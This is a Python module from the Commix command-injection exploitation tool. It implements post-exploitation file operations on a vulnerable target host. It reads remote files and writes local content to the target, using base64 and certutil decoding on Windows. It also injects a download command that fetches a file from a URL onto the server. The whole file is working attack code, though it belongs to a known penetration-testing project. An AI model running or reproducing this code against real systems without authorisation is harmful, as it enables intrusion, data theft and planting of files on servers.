#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import urllib as _urllib

from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.thirdparty.colorama import Style
from src.utils import menu
from src.utils import session_handler
from src.utils import settings

"""
The "file-based" technique on semiblind OS command injection.
"""

"""
Read a file from the target host.
"""


def file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter,
              OUTPUT_TEXTFILE, alter_shell, filename):
    file_to_read = menu.options.file_read
    # Execute command
    if settings.TARGET_OS == "win":
        cmd = settings.WIN_FILE_READ + file_to_read
    else:
        cmd = settings.FILE_READ + file_to_read
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        # Command execution results.
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        # Evaluate injection results.
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = "".join(str(p) for p in shell)
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if settings.VERBOSITY_LEVEL != 0 and menu.options.ignore_session:
        print(settings.SINGLE_WHITESPACE)
    if shell:
        info_msg = "The contents of file '"
        info_msg += file_to_read + "'" + Style.RESET_ALL + ": "
        sys.stdout.write(settings.print_bold_info_msg(info_msg))
        print(shell)
        output_file = open(filename, "a")
        info_msg = "The contents of file '"
        info_msg += file_to_read + "' : " + shell + ".\n"
        output_file.write(
            re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("", settings.INFO_BOLD_SIGN) + info_msg)
        output_file.close()
    else:
        warn_msg = "It seems that you don't have permissions "
        warn_msg += "to read the '" + file_to_read + "' file."
        sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
        sys.stdout.flush()


"""
Write to a file on the target host.
"""


def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter,
               OUTPUT_TEXTFILE, alter_shell, filename):
    file_to_write = menu.options.file_write
    if not os.path.exists(file_to_write):
        warn_msg = "It seems that the provided local file '" + file_to_write + "', does not exist."
        sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
        sys.stdout.flush()
        raise SystemExit()

    if os.path.isfile(file_to_write):
        with open(file_to_write, 'r') as content_file:
            content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
        content = "".join(str(p) for p in content).replace("'", "\"")
        if settings.TARGET_OS == "win":
            import base64
            content = base64.b64encode(content)
    else:
        warn_msg = "It seems that '" + file_to_write + "' is not a file."
        sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
        sys.stdout.flush()

    if os.path.split(menu.options.file_dest)[1] == "":
        dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
        dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
    else:
        dest_to_write = menu.options.file_dest

    # Execute command
    if settings.TARGET_OS == "win":
        dest_to_write = dest_to_write.replace("\\", "/")
        # Find path
        path = os.path.dirname(dest_to_write)
        path = path.replace("/", "\\")
        # Change directory
        cmd = "cd " + path + separator + separator + " " + settings.WIN_COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        # Find filename
        filname = os.path.basename(dest_to_write)
        tmp_filname = "tmp_" + filname
        cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname + separator + " " + settings.WIN_COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        # Decode base 64 encoding
        cmd = "certutil -decode " + tmp_filname + " " + filname + separator + " " + settings.WIN_COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        # fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        # Delete tmp file
        cmd = "del " + tmp_filname + separator + " " + settings.WIN_COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        # fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        # Check if file exists
        cmd = "cmd /c if exist " + filname + " (echo " + filname + ")"
        dest_to_write = path + "\\" + filname

    else:
        cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'" + settings.COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = "".join(str(p) for p in shell)
        # Check if file exists
        cmd = "echo $(ls " + dest_to_write + ")"

    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url,
                                     vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
    shell = "".join(str(p) for p in shell)
    if shell:
        if settings.VERBOSITY_LEVEL != 0:
            print(settings.SINGLE_WHITESPACE)
        info_msg = "The " + shell + Style.RESET_ALL
        info_msg += Style.BRIGHT + " file was created successfully!" + "\n"
        sys.stdout.write(settings.print_bold_info_msg(info_msg))
        sys.stdout.flush()
    else:
        warn_msg = "It seems that you don't have permissions to write the '" + dest_to_write + "' file."
        sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
        sys.stdout.flush()


"""
Upload a file on the target host.
"""


def file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter,
                OUTPUT_TEXTFILE, alter_shell, filename):
    if settings.TARGET_OS == "win":
        # Not yet implemented
        pass
    else:
        file_to_upload = menu.options.file_upload
        # check if remote file exists.
        try:
            _urllib.request.urlopen(file_to_upload, timeout=settings.TIMEOUT)
        except _urllib.error.HTTPError as err_msg:
            warn_msg = "It seems that the '" + file_to_upload + "' file, does not exist. (" + str(err_msg) + ")"
            sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
            sys.stdout.flush()
            raise SystemExit()
        except ValueError as err_msg:
            err_msg = str(err_msg[0]).capitalize() + str(err_msg)[1]
            sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
            sys.stdout.flush()
            raise SystemExit()

            # Check the file-destination
        if os.path.split(menu.options.file_dest)[1] == "":
            dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
        elif os.path.split(menu.options.file_dest)[0] == "/":
            dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + \
                             os.path.split(menu.options.file_upload)[1]
        else:
            dest_to_upload = menu.options.file_dest

        # Execute command
        cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = "".join(str(p) for p in shell)

        # Check if file exists!
        if settings.TARGET_OS == "win":
            cmd = "dir " + dest_to_upload + ")"
        else:
            cmd = "echo $(ls " + dest_to_upload + ")"
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method,
                                         url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = "".join(str(p) for p in shell)
        if shell:
            if settings.VERBOSITY_LEVEL != 0:
                print(settings.SINGLE_WHITESPACE)
            info_msg = "The " + shell
            info_msg += Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!"
            sys.stdout.write(settings.print_bold_info_msg(info_msg) + "\n")
            sys.stdout.flush()
        else:
            warn_msg = "It seems that you don't have permissions to "
            warn_msg += "write the '" + dest_to_upload + "' file."
            sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
            sys.stdout.flush()


"""
Check the defined options
"""


def do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter,
             OUTPUT_TEXTFILE, alter_shell, filename):
    if menu.options.file_write:
        file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url,
                   vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True

    if menu.options.file_upload:
        file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url,
                    vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True

    if menu.options.file_read:
        file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url,
                  vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True

        # eof
